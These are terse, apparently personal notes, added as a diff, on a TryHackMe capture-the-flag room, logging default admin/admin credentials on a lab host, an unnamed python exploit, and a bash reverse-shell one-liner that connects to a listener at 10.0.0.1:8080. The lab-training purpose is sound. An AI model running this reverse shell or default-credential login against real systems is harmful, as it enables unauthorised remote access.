@@ -1,0 +1,13 @@
+
+In http://10.10.133.53/index
+
+Got, username: admin and password: admin
+
+Ran the python script
+
+cmd: which bash
+
+cpy to pwd in attacker direc:  bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+See: https://stawm.design.blog/2020/06/06/ignite-tryhackme-writeup/
+
